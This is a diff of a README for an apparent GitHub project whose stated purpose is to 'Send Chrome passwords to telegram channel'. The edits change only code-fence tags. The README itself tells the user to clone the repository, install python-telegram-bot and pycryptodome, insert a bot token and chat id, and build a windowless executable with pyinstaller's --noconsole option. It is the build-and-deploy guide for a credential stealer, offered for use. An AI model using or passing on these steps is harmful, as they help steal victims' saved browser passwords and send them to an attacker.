@@ -2,12 +2,12 @@
 Send Chrome passwords to telegram channel
 
 ## Installation
-```
+``` bash
 git clone https://github.com/abdurohman-karim/password_sender.git
 ```
 
 ## Installation Libraries
-``` shell
+``` 
 pip install python-telegram-bot
 
 pip install pycryptodome
@@ -29,7 +29,7 @@ Change [bot_token] to your bot token, and change chat_id to your channel chat_id
 pip install pyinstaller
 ```
 ### And run 
-```
+``` bash
 pyinstaller --onefile --noconsole your_python_file.py
 ```
 It's save your_python_file.exe to dist/your_python_file.exe
